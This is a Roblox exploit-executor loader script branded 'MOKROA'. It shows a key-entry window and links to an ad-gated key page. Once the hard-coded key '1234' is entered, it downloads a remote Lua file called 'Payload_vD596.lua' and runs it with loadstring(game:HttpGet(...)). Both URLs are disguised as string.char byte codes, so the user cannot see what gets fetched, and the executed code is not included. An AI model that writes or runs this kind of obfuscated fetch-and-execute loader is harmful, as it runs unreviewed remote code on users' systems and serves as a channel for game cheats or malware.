
--[[ MOKROA LOADER ]]
local CoreGui = game:GetService("CoreGui")
local _REAL_KEY = string.char(49, 50, 51, 52)
local _LINK = string.char(104, 116, 116, 112, 115, 58, 47, 47, 108, 105, 110, 107, 118, 101, 114, 116, 105, 115, 101, 46, 99, 111, 109, 47, 50, 54, 50, 56, 54, 53, 48, 47, 120, 57, 57, 113, 122, 97, 55, 55, 111, 56, 47, 100, 121, 110, 97, 109, 105, 99, 63, 114, 61, 97, 72, 82, 48, 99, 72, 77, 54, 76, 121, 57, 121, 89, 88, 99, 117, 90, 50, 108, 48, 97, 72, 86, 105, 100, 88, 78, 108, 99, 109, 78, 118, 98, 110, 82, 108, 98, 110, 81, 117, 89, 50, 57, 116, 76, 50, 53, 118, 98, 109, 70, 116, 90, 87, 49, 104, 98, 110, 78, 107, 76, 51, 74, 118, 89, 109, 120, 118, 101, 72, 78, 106, 99, 109, 108, 119, 100, 72, 77, 118, 98, 87, 70, 112, 98, 105, 57, 76, 90, 88, 108, 84, 100, 71, 86, 119, 88, 50, 100, 72, 85, 88, 86, 88, 101, 105, 53, 48, 101, 72, 81, 61)
local _PAYLOAD = string.char(104, 116, 116, 112, 115, 58, 47, 47, 114, 97, 119, 46, 103, 105, 116, 104, 117, 98, 117, 115, 101, 114, 99, 111, 110, 116, 101, 110, 116, 46, 99, 111, 109, 47, 110, 111, 110, 97, 109, 101, 109, 97, 110, 115, 100, 47, 114, 111, 98, 108, 111, 120, 115, 99, 114, 105, 112, 116, 115, 47, 109, 97, 105, 110, 47, 80, 97, 121, 108, 111, 97, 100, 95, 118, 68, 53, 57, 54, 46, 108, 117, 97)

if CoreGui:FindFirstChild("B7wOKZlb") then CoreGui["B7wOKZlb"]:Destroy() end
local ScreenGui = Instance.new("ScreenGui", CoreGui); ScreenGui.Name = "B7wOKZlb"

local Main = Instance.new("Frame", ScreenGui); Main.Size = UDim2.new(0,350,0,200); Main.Position = UDim2.new(0.5,-175,0.5,-100)
Main.BackgroundColor3 = Color3.fromRGB(20,20,25); 
Instance.new("UICorner", Main).CornerRadius = UDim.new(0,10)

local Title = Instance.new("TextLabel", Main); Title.Size = UDim2.new(1,0,0,40); Title.Text = "MOKROA KEY SYSTEM"
Title.TextColor3 = Color3.new(1,1,1); Title.BackgroundTransparency = 1; Title.Font = Enum.Font.GothamBold; Title.TextSize = 18

local Box = Instance.new("TextBox", Main); Box.Size = UDim2.new(0.8,0,0,40); Box.Position = UDim2.new(0.1,0,0.35,0)
Box.PlaceholderText = "Enter Key"; Box.BackgroundColor3 = Color3.fromRGB(35,35,40); Box.TextColor3 = Color3.new(1,1,1)
Instance.new("UICorner", Box).CornerRadius = UDim.new(0,6)

local Btn = Instance.new("TextButton", Main); Btn.Size = UDim2.new(0.35,0,0,40); Btn.Position = UDim2.new(0.55,0,0.65,0)
Btn.Text = "SUBMIT"; Btn.BackgroundColor3 = Color3.fromRGB(0, 255, 120); Btn.Font = Enum.Font.GothamBold
Instance.new("UICorner", Btn).CornerRadius = UDim.new(0,6)

local BtnLink = Instance.new("TextButton", Main); BtnLink.Size = UDim2.new(0.35,0,0,40); BtnLink.Position = UDim2.new(0.1,0,0.65,0)
BtnLink.Text = "GET KEY"; BtnLink.BackgroundColor3 = Color3.fromRGB(50,50,50); BtnLink.TextColor3 = Color3.new(1,1,1); BtnLink.Font = Enum.Font.GothamBold
Instance.new("UICorner", BtnLink).CornerRadius = UDim.new(0,6)

BtnLink.MouseButton1Click:Connect(function() setclipboard(_LINK); BtnLink.Text="COPIED!"; task.wait(1); BtnLink.Text="GET KEY" end)

Btn.MouseButton1Click:Connect(function()
    if Box.Text == _REAL_KEY then
        Btn.Text = "SUCCESS"
        task.wait(0.5)
        ScreenGui:Destroy()
        loadstring(game:HttpGet(_PAYLOAD))()
    else
        Btn.Text = "WRONG"
        Btn.BackgroundColor3 = Color3.fromRGB(200,50,50)
        task.wait(1)
        Btn.Text = "SUBMIT"
        Btn.BackgroundColor3 = Color3.fromRGB(0, 255, 120)
    end
end)
